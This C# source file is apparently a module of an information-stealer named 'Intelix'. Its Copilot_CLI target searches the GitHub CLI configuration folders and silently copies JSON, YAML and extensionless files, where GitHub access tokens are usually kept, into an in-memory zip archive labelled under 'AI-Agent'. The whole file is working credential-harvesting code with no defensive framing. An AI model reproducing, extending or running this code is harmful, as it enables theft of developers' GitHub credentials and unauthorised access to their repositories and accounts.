using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Copilot_CLI : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var entry = new Counter.CounterApplications { Name = "Copilot CLI" };
            string[] paths = {
                Path.Combine(appdata, "GitHub CLI"),
                Path.Combine(userProfile, ".config", "gh")
            };
            foreach (string dir in paths)
            {
                if (!Directory.Exists(dir)) continue;
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly))
                {
                    string ext = Path.GetExtension(file).ToLower();
                    if (ext != ".json" && ext != ".yml" && ext != ".yaml" && ext != "") continue;
                    if (new FileInfo(file).Length > 1 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\CopilotCLI\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
